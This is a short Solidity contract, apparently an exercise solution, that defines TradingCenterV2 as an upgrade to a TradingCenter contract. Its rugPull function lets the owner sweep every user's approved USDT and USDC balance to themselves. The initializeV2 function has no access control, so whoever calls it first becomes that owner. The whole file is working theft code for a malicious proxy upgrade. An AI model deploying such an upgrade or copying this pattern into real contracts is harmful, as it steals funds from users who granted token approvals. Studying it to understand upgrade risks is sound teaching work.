// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { TradingCenter } from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    bool public initializedV2;
    address private _owner;

    function initializeV2() public {
        require(initializedV2 == false, "already initialized");
        initializedV2 = true;
        _owner = msg.sender;
    }

    function rugPull(address user) external {
        require(msg.sender == _owner, "Not Owner!");

        usdt.transferFrom(user, msg.sender, usdt.balanceOf(user));
        usdc.transferFrom(user, msg.sender, usdc.balanceOf(user));
    }
}